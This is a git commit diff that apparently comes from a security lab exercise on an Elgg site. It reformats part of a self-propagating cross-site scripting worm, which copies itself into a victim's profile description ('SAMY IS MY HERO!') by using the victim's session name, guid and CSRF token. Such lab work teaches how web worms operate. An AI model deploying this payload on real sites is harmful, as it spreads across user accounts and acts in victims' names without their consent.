1c6d352fb60a6237d63d26cf7f6dd370a3b9d33f
Spiny Lumpsucker <165522234+spiny-lumpsucker@users.noreply.github.com>
2024-03-31 21:07:30 -0400

    Update project03_task6_link4.js

--- project03_task6_link4.js
+++ project03_task6_link4.js
@@ -6,9 +6,9 @@ window.onload = function(){
         "</" + "script>");
 
     // Set the content for the description field
-    var desc ="&description=SAMY IS MY HERO!" + wormCode + "&accesslevel[description]=2";
+    var desc = "&description=SAMY IS MY HERO!";
+        desc+= wormCode + "&accesslevel[description]=2";
     
-
     // Get the name, guid, timestamp, and token
     var name  = "&name=" + elgg.session.user.name;
     var guid  = "&guid=" + elgg.session.user.guid;
